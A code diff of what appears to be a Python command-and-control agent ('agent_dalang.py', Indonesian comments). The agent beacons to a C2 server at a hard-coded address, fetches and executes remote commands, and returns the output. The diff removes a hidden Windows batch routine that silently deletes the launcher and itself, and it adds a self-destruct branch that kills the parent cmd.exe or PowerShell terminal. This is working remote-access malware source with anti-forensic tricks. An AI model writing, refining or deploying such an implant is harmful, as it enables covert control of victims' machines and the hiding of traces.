@@ -1,5 +1,3 @@
-# agent_dalang.py
-
 import requests
 import subprocess
 import time
@@ -7,10 +5,15 @@ import random
 import socket
 import getpass
 import platform
-import sys  # DIUBAH: Tambahkan import sys untuk keluar dari script
+import sys
+import os
+try:
+    import psutil # Coba impor psutil
+except ImportError:
+    psutil = None # Jika tidak ada, set ke None
 
 # --- KONFIGURASI ---
-C2_URL = "http://192.168.1.100:5000" 
+C2_URL = "http://192.168.1.100:5000"
 AGENT_ID = None
 
 # --- Fungsi register_agent, get_task, execute_task, send_results (Tidak ada perubahan) ---
@@ -66,7 +69,6 @@ def send_results(task_id, output):
     except requests.exceptions.RequestException as e:
         print(f"[!] Gagal mengirim hasil: {e}")
 
-
 def main_loop():
     """Loop utama untuk operasional agent."""
     register_agent()
@@ -85,34 +87,25 @@ def main_loop():
             command = task.get("command")
             tool = task.get("tool")
 
-            # --- BLOK LOGIKA BARU UNTUK TERMINATE ---
+            # --- BLOK LOGIKA TERMINATE YANG DISEMPURNAKAN ---
             if tool == "internal" and command == "self-destruct":
-                print("[!] Menerima perintah terminate. Keluar.")
-                send_results(task_id, "Agent terminated successfully.")
-		 if BAT_TO_DELETE and os.path.exists(BAT_TO_DELETE):
-                    cleanup_script_path = os.path.join(os.environ["TEMP"], 						f"cleanup_{random.randint(1000,9999)}.bat")
-               
-                    # --- PERUBAHAN UTAMA: Skrip pembersih dibuat tanpa ECHO ---
-                    with open(cleanup_script_path, "w") as f:
-                        f.write(f'@echo off\n')
-                        f.write(f'timeout /t 2 /nobreak > NUL\n')
-                        f.write(f'del "{BAT_TO_DELETE}"\n')
-                        f.write(f'(goto) 2>nul & del "%~f0"')
-                    
-                    # --- PERUBAHAN UTAMA: Menambahkan creationflags yang spesifik untuk Windows ---
-                    # Ini akan memastikan tidak ada jendela CMD yang muncul sama sekali.
-                    DETACHED_PROCESS = 0x00000008
-                    CREATE_NO_WINDOW = 0x08000000
-                    
-                    subprocess.Popen(
-                        ['cmd.exe', '/c', cleanup_script_path],
-                        creationflags=DETACHED_PROCESS | CREATE_NO_WINDOW
-                    )
-                    print(f"[*] Skrip pembersih tak terlihat diluncurkan untuk menghapus {BAT_TO_DELETE}")
-
-                sys.exit(0)	                
-
-		sys.exit(0) # Perintah untuk keluar dari script
+                print("[!] Menerima perintah terminate. Menutup terminal induk dan keluar.")
+                send_results(task_id, "Agent terminated successfully. Parent terminal closure attempted.")
+                
+                if psutil:
+                    try:
+                        current_process = psutil.Process(os.getpid())
+                        parent_process = current_process.parent()
+                        
+                        # Cek apakah induknya adalah cmd.exe atau powershell.exe
+                        if parent_process.name().lower() in ["cmd.exe", "powershell.exe"]:
+                            print(f"[*] Menemukan proses induk: {parent_process.name()} (PID: {parent_process.pid})")
+                            parent_process.kill() # Mengirim sinyal kill ke proses induk
+                            print("[+] Perintah kill ke terminal induk telah dikirim.")
+                    except psutil.Error as e:
+                        print(f"[!] Gagal menghentikan terminal induk: {e}")
+                
+                sys.exit(0) # Agent tetap keluar meskipun gagal mematikan induknya
 
             if command == "sleep":
                 sleep_duration = task.get("duration", 30)
@@ -127,4 +120,7 @@ def main_loop():
             time.sleep(30)
 
 if __name__ == "__main__":
+    if psutil is None:
+        print("[WARNING] Modul 'psutil' tidak ditemukan. Fitur penutupan terminal otomatis tidak akan berfungsi.")
+        print("[INFO] Silakan instal dengan: pip install psutil")
     main_loop()
